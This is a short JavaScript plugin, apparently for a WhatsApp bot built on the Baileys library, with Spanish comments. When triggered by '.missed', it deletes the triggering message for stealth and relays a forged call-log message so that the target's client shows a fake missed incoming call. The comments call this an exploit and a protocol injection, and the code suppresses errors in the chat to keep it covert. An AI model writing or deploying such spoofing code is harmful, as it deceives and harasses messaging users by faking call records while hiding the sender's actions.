import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

export default {
    name: 'llamada_fantasma',
    match: (text) => /^\.missed/i.test(text),
    execute: async ({ sock, remitente, msg }) => {
        
        try {
            // Sigilo: borramos el comando desencadenante
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // Determinamos el objetivo (si es respuesta o es el chat actual)
            const targetJid = msg.message.extendedTextMessage?.contextInfo?.participant || remitente;

            // EXPLOIT: Construcción del contenedor CallLog nativo
            // Este paquete le dice al cliente de la víctima: "Hubo una llamada y falló".
            const waMsg = generateWAMessageFromContent(remitente, {
                callLogMessage: {
                    isNewCall: true,
                    isMissed: true, // Flag de llamada perdida
                    isVideocall: false,
                    callLogRecords: [{
                        callLogRecord: {
                            callResult: 1, // 1 = MISSED / 2 = REJECTED
                            isIncoming: true,
                            timestamp: Date.now()
                        }
                    }]
                }
            }, { userJid: sock.user.id });

            // Inyección de protocolo
            await sock.relayMessage(remitente, waMsg.message, { messageId: waMsg.key.id });

        } catch (err) {
            console.error("Error en CallLog Injection:", err);
            // No enviamos error al chat para no romper la estética del exploit
        }
    }
};
